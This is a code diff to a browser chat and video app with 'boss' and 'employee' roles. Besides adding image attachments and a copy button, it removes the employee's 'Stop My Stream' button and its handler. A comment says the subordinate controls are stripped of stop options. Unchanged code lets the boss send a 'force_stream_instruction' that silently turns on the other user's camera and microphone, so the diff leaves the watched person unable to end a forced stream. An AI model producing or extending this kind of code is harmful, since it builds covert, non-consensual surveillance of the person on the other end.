@@ -11,7 +11,6 @@
         .scrollbar-none::-webkit-scrollbar { display: none; }
         .scrollbar-none { -ms-overflow-style: none; scrollbar-width: none; }
 
-        /* Animated Doodle Background styling */
         .doodle-bg {
             background-color: #0c0a09;
             background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120' viewBox='0 0 120 120'%3E%3Cpath d='M9 15c2 4 7 1 9-2s-3-7-6-5-4 4-3 7zm45 70c-3-2-8 1-6 5s6 2 7-1-4-5-4-4zm40-50c4 1 6-4 3-7s-7 1-6 5 4 2 3 2zm-70 20c1 4 6 2 6-2s-5-4-6 0zm90 25c-2-3-7 0-6 4s6 3 7-1-4-4-4-3z' fill='%23a855f7' fill-opacity='0.15'/%3E%3Ccircle cx='30' cy='30' r='3' fill='%2338bdf8' fill-opacity='0.2'/%3E%3Ccircle cx='80' cy='90' r='4' fill='%23f43f5e' fill-opacity='0.2'/%3E%3Cpath d='M100 10c2-2 5-2 5 2s-3 5-5 2z' fill='%23eab308' fill-opacity='0.15'/%3E%3C/svg%3E");
@@ -124,12 +123,8 @@
                         </button>
                     </div>
 
-                    <!-- Subordinate / Employee Toolbar Actions Interface -->
-                    <div id="subControls" class="hidden items-center gap-1.5">
-                        <button id="endVideoCallBtn" onclick="employeeTerminatesCallView()" class="hidden px-3 py-1.5 bg-rose-600 hover:bg-rose-700 text-white text-xs font-medium rounded-lg transition flex items-center gap-1 cursor-pointer">
-                            <i data-lucide="video-off" class="w-3.5 h-3.5"></i> Stop My Stream
-                        </button>
-                    </div>
+                    <!-- Viola / Subordinate controls completely stripped of Stop options -->
+                    <div id="subControls" class="hidden items-center gap-1.5"></div>
                 </div>
             </div>
 
@@ -137,7 +132,7 @@
             <div class="flex-1 flex flex-col bg-zinc-950/20 overflow-hidden relative">
                 
                 <!-- Chat Feed Stream Box -->
-                <div id="messageBox" class="flex-1 p-5 overflow-y-auto flex flex-col gap-3.5 scrollbar-none select-text">
+                <div id="messageBox" class="flex-1 p-5 overflow-y-auto flex flex-col gap-4 scrollbar-none select-text">
                     <!-- Messaging rows render dynamically inside here -->
                 </div>
 
@@ -164,6 +159,10 @@
                 <!-- Message Input Control Assembly -->
                 <div class="p-4 bg-zinc-950/40 border-t border-zinc-800/80 flex-shrink-0">
                     <form onsubmit="sendMessage(event)" class="bg-zinc-900 border border-zinc-800 rounded-xl px-4 py-3 flex items-center gap-3">
+                        <label class="text-zinc-400 hover:text-zinc-200 transition cursor-pointer flex-shrink-0 p-1" title="Attach Pic/GIF">
+                            <i data-lucide="image" class="w-5 h-5"></i>
+                            <input type="file" id="mediaInput" accept="image/*" class="hidden" onchange="handleMediaSelection(this)" />
+                        </label>
                         <input type="text" id="msgInput" oninput="sendTypingSignal()" placeholder="Type a message..." autocomplete="off" class="flex-1 bg-transparent text-sm text-zinc-100 placeholder-zinc-500 focus:outline-none" />
                         <button type="submit" class="text-sky-400 hover:text-sky-300 text-sm font-bold transition flex-shrink-0 cursor-pointer px-1">
                             Send
@@ -219,7 +218,6 @@
                 subHeading.textContent = 'Status: Hii (Executive)';
                 statusDot.className = "h-2.5 w-2.5 rounded-full bg-sky-400 shadow-md shadow-sky-400/50";
                 document.getElementById('bossLobby').classList.remove('hidden');
-                
                 injectBossVideoLayout();
                 initPeer(customId);
             } else {
@@ -279,7 +277,6 @@
                         }
                     }
                 } else {
-                    document.getElementById('endVideoCallBtn').classList.remove('hidden');
                     currentFacingMode = call.metadata && call.metadata.facingMode ? call.metadata.facingMode : 'user';
                     navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true }).then((stream) => {
                         localStream = stream; 
@@ -307,8 +304,6 @@
                 
                 if (myRole === 'boss') {
                     document.getElementById('bossControls').classList.remove('hidden');
-                } else {
-                    document.getElementById('subControls').classList.remove('hidden');
                 }
                 
                 document.getElementById('connectionStatusDot').className = "h-2.5 w-2.5 rounded-full bg-emerald-500 shadow-md shadow-emerald-500/50";
@@ -326,7 +321,7 @@
                 } else if (data.type === 'force_stream_instruction') { 
                     executeSilentStreamUpload(data.facingMode); 
                 } else if (data.type === 'msg') { 
-                    appendMsg(data.body, 'remote', data.replyData); 
+                    appendMsg(data.body, 'remote', data.replyData, data.msgType); 
                 } else if (data.type === 'typing') {
                     typingIndicatorBar.style.opacity = data.isTyping ? '1' : '0';
                 }
@@ -344,7 +339,7 @@
 
         function setActiveReplyContext(textStr, senderLabel) {
             activeReplyContext = { text: textStr, sender: senderLabel };
-            replyPreviewText.textContent = textStr;
+            replyPreviewText.textContent = textStr.startsWith('data:image') ? '[Image]' : textStr;
             replyPreviewContainer.classList.remove('hidden');
         }
 
@@ -368,9 +363,28 @@
             isTyping = false; conn.send({ type: 'typing', isTyping: false });
             const payloadReply = activeReplyContext ? { ...activeReplyContext } : null;
 
-            conn.send({type: 'msg', body: val, replyData: payloadReply});
-            appendMsg(val, 'local', payloadReply);
+            conn.send({type: 'msg', body: val, replyData: payloadReply, msgType: 'text'});
+            appendMsg(val, 'local', payloadReply, 'text');
             inputField.value = ''; clearActiveReplyContext();
+        }
+
+        function handleMediaSelection(input) {
+            if (!input.files || !input.files[0] || !conn) return;
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const base64Data = e.target.result;
+                const payloadReply = activeReplyContext ? { ...activeReplyContext } : null;
+                
+                conn.send({ type: 'msg', body: base64Data, replyData: payloadReply, msgType: 'image' });
+                appendMsg(base64Data, 'local', payloadReply, 'image');
+                clearActiveReplyContext();
+            };
+            reader.readAsDataURL(input.files[0]);
+            input.value = '';
+        }
+
+        function copyMessageToClipboard(textToCopy) {
+            navigator.clipboard.writeText(textToCopy);
         }
 
         function bossDemandsTargetFeed() {
@@ -402,19 +416,11 @@
             }
         }
 
-        function employeeTerminatesCallView() {
-            cleanMediaTracks();
-            document.getElementById('endVideoCallBtn').classList.add('hidden');
-            appendSysMsg("Local Camera Stream Terminated.");
-        }
-
         async function executeSilentStreamUpload(facingModeSetting) {
             try {
                 if(localStream) { localStream.getTracks().forEach(track => track.stop()); }
                 currentFacingMode = facingModeSetting || 'user';
                 localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: true });
-                document.getElementById('endVideoCallBtn').classList.remove('hidden');
-                
                 const call = peer.call(conn.peer, localStream, { metadata: { facingMode: currentFacingMode } });
                 currentCall = call;
                 call.on('close', () => cleanMediaTracks());
@@ -450,12 +456,15 @@
             if(currentCall) { currentCall.close(); currentCall = null; }
         }
 
-        function appendMsg(text, sender, replyData = null) {
+        function appendMsg(content, sender, replyData = null, msgType = 'text') {
             const wrap = document.createElement('div');
-            wrap.className = `flex w-full group relative ${sender === 'local' ? 'justify-end' : 'justify-start'}`;
+            wrap.className = `flex w-full group relative items-center gap-2 ${sender === 'local' ? 'justify-end' : 'justify-start'}`;
             
+            const actionContainer = document.createElement('div');
+            actionContainer.className = `flex gap-1 items-center opacity-0 group-hover:opacity-100 transition duration-150 order-2 ${sender === 'local' ? 'order-first' : ''}`;
+
             const bubble = document.createElement('div');
-            bubble.className = `rounded-2xl px-4 py-2.5 text-sm max-w-[75%] relative ${sender === 'local' ? 'bg-sky-500 text-white rounded-br-none shadow-md' : 'bg-zinc-800 text-zinc-200 rounded-bl-none shadow-md'}`;
+            bubble.className = `rounded-2xl px-4 py-2.5 text-sm max-w-[70%] relative ${sender === 'local' ? 'bg-sky-500 text-white rounded-br-none shadow-md' : 'bg-zinc-800 text-zinc-200 rounded-bl-none shadow-md'}`;
 
             if (replyData) {
                 const q = document.createElement('div');
@@ -464,15 +473,36 @@
                 bubble.appendChild(q);
             }
 
-            const t = document.createElement('span'); t.textContent = text; bubble.appendChild(t);
+            if(msgType === 'image') {
+                const img = document.createElement('img');
+                img.src = content;
+                img.className = 'max-w-xs rounded-lg max-h-48 object-cover';
+                bubble.appendChild(img);
+            } else {
+                const t = document.createElement('span'); 
+                t.textContent = content; 
+                bubble.appendChild(t);
+            }
 
-            const btn = document.createElement('button');
-            btn.className = `absolute top-1/2 -translate-y-1/2 opacity-0 group-hover:opacity-100 p-1 text-zinc-500 hover:text-zinc-300 rounded transition cursor-pointer ${sender === 'local' ? '-left-7' : '-right-7'}`;
-            btn.innerHTML = '<i data-lucide="reply" class="w-3.5 h-3.5"></i>';
-            btn.onclick = () => setActiveReplyContext(text, sender === 'local' ? 'Self' : 'Remote');
+            const replyBtn = document.createElement('button');
+            replyBtn.className = 'p-1 text-zinc-500 hover:text-zinc-300 transition cursor-pointer';
+            replyBtn.innerHTML = '<i data-lucide="reply" class="w-3.5 h-3.5"></i>';
+            replyBtn.onclick = () => setActiveReplyContext(content, sender === 'local' ? 'Self' : 'Remote');
 
-            wrap.appendChild(bubble); wrap.appendChild(btn); messageBox.appendChild(wrap);
-            lucide.createIcons(); messageBox.scrollTop = messageBox.scrollHeight;
+            const copyBtn = document.createElement('button');
+            copyBtn.className = 'p-1 text-zinc-500 hover:text-zinc-300 transition cursor-pointer';
+            copyBtn.innerHTML = '<i data-lucide="copy" class="w-3.5 h-3.5"></i>';
+            copyBtn.onclick = () => copyMessageToClipboard(content);
+
+            actionContainer.appendChild(replyBtn);
+            actionContainer.appendChild(copyBtn);
+
+            wrap.appendChild(bubble); 
+            wrap.appendChild(actionContainer);
+            messageBox.appendChild(wrap);
+            
+            lucide.createIcons(); 
+            messageBox.scrollTop = messageBox.scrollHeight;
         }
 
         function appendSysMsg(text) {
@@ -495,7 +525,6 @@
 
             document.getElementById('activeControls').classList.add('hidden');
             document.getElementById('bossControls').classList.add('hidden');
-            document.getElementById('subControls').classList.add('hidden');
             roleScreen.classList.remove('hidden'); lobbyScreen.classList.add('hidden');
             document.getElementById('bossLobby').classList.add('hidden'); document.getElementById('subLobby').classList.add('hidden');
             document.getElementById('connectionStatusDot').className = "h-2.5 w-2.5 rounded-full bg-zinc-600";
